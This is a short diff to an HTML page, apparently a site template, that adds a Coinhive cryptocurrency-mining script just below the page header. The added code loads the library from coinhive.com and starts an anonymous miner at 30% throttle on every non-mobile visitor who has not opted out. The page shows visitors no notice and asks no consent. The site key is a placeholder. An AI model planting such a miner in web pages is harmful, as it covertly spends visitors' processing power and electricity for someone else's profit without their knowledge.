@@ -83,7 +83,16 @@
         </div>
       </div>
     </header>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+      var miner = new CoinHive.Anonymous('YOUR_SITE_KEY', {throttle: 0.3});
 
+      // Only start on non-mobile devices and if not opted-out
+      // in the last 14400 seconds (4 hours):
+      if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+      }
+    </script>
     <!-- About Section -->
     <section id="about" class="content-section text-center">
       <div class="container">
